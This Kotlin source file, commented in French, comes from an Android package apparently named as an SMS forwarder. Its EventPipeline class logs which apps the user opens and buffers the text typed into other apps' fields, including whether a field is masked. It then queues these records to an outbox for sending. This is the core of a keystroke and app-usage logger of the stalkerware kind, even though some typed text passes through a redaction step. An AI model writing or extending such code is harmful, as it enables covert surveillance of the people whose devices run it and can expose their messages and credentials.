package com.smsforwarder

import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicInteger

/**
 * File bornée en mémoire, déduplication des apps, debounce des frappes.
 *
 * Aucune I/O sur le thread appelant : tout part dans un scope IO.
 */
class EventPipeline(
    private val outbox: EventOutbox,
        private val onFlush: () -> Unit
) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val queue = ArrayDeque<JSONObject>()
    private val overflow = AtomicInteger(0)

    private var lastPackage = ""
    private var lastPackageAt = 0L
    private var lastEmitAt = 0L

    private var bufferPackage: String? = null
        private var bufferField: String = ""
            private var bufferAdded = StringBuilder()
            private var bufferRemoved = 0
            private var bufferKind = "text"
            private var bufferMasked = false
            private var bufferAddN = -1
            private var debounceJob: Job? = null

                // ---- applications ---------------------------------------------------

                fun offerApp(pkg: String, label: String, className: String) {
                    val now = System.currentTimeMillis()
                    if (pkg == lastPackage && now - lastPackageAt < Config.DEDUPE_WINDOW_MS) return

                        lastPackage = pkg
                        lastPackageAt = now
                        lastEmitAt = now

                        enqueue(JSONObject().apply {
                            put("package", pkg)
                            put("label", label)
                            put("className", className)
                            put("ts", now)
                        }, "app")
                }

                // ---- frappes --------------------------------------------------------

                fun onText(
                    pkg: String,
                    field: String,
                    added: String,
                    removed: Int,
                    masked: Boolean,
                    addN: Int,
                    kind: String
                ) {
                    if (bufferPackage != pkg || bufferField != field) {
                        flushKeys()
                        bufferPackage = pkg
                        bufferField = field
                    }

                    if (addN >= 0) {
                        bufferAddN = (if (bufferAddN < 0) 0 else bufferAddN) + addN
                    }
                    bufferAdded.append(added)
                    bufferRemoved += removed
                    bufferKind = kind
                    bufferMasked = bufferMasked || masked

                    debounceJob?.cancel()
                    debounceJob = scope.launch {
                        delay(Config.EVENT_DEBOUNCE_MS)
                        flushKeys()
                    }
                }

                fun flushKeys() {
                    val pkg = bufferPackage ?: return
                    val added = bufferAdded.toString()
                    val removed = bufferRemoved
                    val addN = bufferAddN
                    val kind = bufferKind
                    val masked = bufferMasked
                    val field = bufferField

                    bufferPackage = null
                    bufferAdded = StringBuilder()
                    bufferRemoved = 0
                    bufferAddN = -1
                    bufferKind = "text"
                    bufferMasked = false

                    if (added.isEmpty() && removed == 0 && addN < 0) return

                        enqueue(JSONObject().apply {
                            put("package", pkg)
                            put("field", field)
                            if (addN >= 0 && added.isEmpty()) put("add_n", addN)
                                else put("added", KeyRedactor.redact(added))
                                    put("removed", removed)
                                    put("kind", kind)
                                    put("masked", masked)
                                    put("ts", System.currentTimeMillis())
                        }, "keys")
                }

                fun flushAll() {
                    flushKeys()
                    drain()
                }

                // ---- interne --------------------------------------------------------

                private fun enqueue(payload: JSONObject, kind: String) {
                    synchronized(queue) {
                        if (queue.size >= Config.PIPELINE_CAPACITY) {
                            queue.removeFirst()
                            overflow.incrementAndGet()
                        }
                        queue.addLast(payload)
                        if (queue.size >= Config.EVENT_MAX_ITEMS) drain()
                    }
                    lastEmitAt = System.currentTimeMillis()
                }

                private fun drain() {
                    val copy = synchronized(queue) {
                        if (queue.isEmpty()) return
                            val list = queue.toList()
                            queue.clear()
                            list
                    }
                    copy.forEach { outbox.enqueue(if (it.has("field")) "keys" else "app", it) }
                    onFlush()
                }

                fun overflowCount(): Int = overflow.get()
}
